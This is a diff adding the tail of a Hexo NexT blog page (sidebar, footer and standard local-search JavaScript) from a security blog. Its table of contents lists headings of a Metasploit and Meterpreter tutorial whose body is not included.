+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="AdminTony" />
+            
+              <p class="site-author-name" itemprop="name">AdminTony</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">61</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">93</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://t00ls.net/index.php" title="T00ls.net" target="_blank">T00ls.net</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.sqlsec.com/" title="国光" target="_blank">国光</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://eternalsakura13.com/" title="Sakura" target="_blank">Sakura</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ares-x.com" title="ares-x" target="_blank">ares-x</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://paper.seebug.org" title="Paper" target="_blank">Paper</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.e-wolf.top/" title="A." target="_blank">A.</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#安装MSF"><span class="nav-number">1.</span> <span class="nav-text">安装MSF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装msf："><span class="nav-number">1.1.</span> <span class="nav-text">安装msf：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装postgresql"><span class="nav-number">1.2.</span> <span class="nav-text">安装postgresql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置metasploit数据库的连接"><span class="nav-number">1.3.</span> <span class="nav-text">配置metasploit数据库的连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解决metasploit搜索缓慢"><span class="nav-number">1.4.</span> <span class="nav-text">解决metasploit搜索缓慢</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#安装Apache2"><span class="nav-number">2.</span> <span class="nav-text">安装Apache2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MSF反弹shell"><span class="nav-number">3.</span> <span class="nav-text">MSF反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#生成dll"><span class="nav-number">3.1.</span> <span class="nav-text">生成dll</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#监听"><span class="nav-number">3.2.</span> <span class="nav-text">监听</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#靶机运行后的效果"><span class="nav-number">3.3.</span> <span class="nav-text">靶机运行后的效果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Meterpreter"><span class="nav-number">4.</span> <span class="nav-text">Meterpreter</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#生成木马"><span class="nav-number">4.1.</span> <span class="nav-text">生成木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Meterpreter控制端使用"><span class="nav-number">4.2.</span> <span class="nav-text">Meterpreter控制端使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#background"><span class="nav-number">4.2.1.</span> <span class="nav-text">background</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对目录和文件的操作"><span class="nav-number">4.2.2.</span> <span class="nav-text">对目录和文件的操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网络相关"><span class="nav-number">4.2.3.</span> <span class="nav-text">网络相关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#系统相关"><span class="nav-number">4.2.4.</span> <span class="nav-text">系统相关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用户接口相关"><span class="nav-number">4.2.5.</span> <span class="nav-text">用户接口相关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#摄像头相关"><span class="nav-number">4.2.6.</span> <span class="nav-text">摄像头相关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他"><span class="nav-number">4.2.7.</span> <span class="nav-text">其他</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">AdminTony</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">69.2k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" rel="external nofollow" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" rel="external nofollow" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+<br><span>Hosted by <a rel="external nofollow" target="_blank" href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></span>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
